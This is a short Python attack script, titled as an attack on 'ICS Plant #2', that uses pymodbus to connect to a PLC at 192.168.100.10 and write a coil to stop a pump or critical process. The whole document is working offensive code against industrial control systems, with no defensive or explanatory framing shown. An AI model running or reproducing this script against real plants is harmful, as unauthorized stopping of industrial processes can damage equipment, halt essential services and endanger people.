#!/usr/bin/env python3
# Attack: Stop Critical Process – ICS Plant #2

from pymodbus.client.sync import ModbusTcpClient

PLC = "192.168.100.10"
STOP_COIL = 5  # Example coil controlling pump

client = ModbusTcpClient(PLC)

print(f"[!] Attempting to stop process at {PLC}")

if client.connect():
    try:
        client.write_coil(STOP_COIL, False)
        print("[!] Pump/Process STOP command issued")
    except Exception as e:
        print("[-] Error:", e)

    client.close()
else:
    print("[-] Unable to connect to PLC")
